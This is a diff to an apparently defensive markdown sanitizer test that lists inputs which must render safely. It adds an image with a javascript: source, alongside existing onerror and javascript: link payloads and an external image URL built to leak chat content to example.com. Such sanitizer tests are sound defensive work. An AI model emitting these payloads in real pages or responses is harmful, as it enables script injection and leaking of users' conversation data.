@@ -16,6 +16,8 @@ Markdown allowlist check for aihub-core-private#389. Every item below must rende
 
 <img src="x" onerror="alert('img onerror')">
 
+<img src="javascript:alert('img src')" alt="An image whose source the allowlist drops">
+
 [A javascript: link](javascript:alert('link'))
 
 ![An external image that would leak data](https://example.com/pixel.png?leak=chat-content)
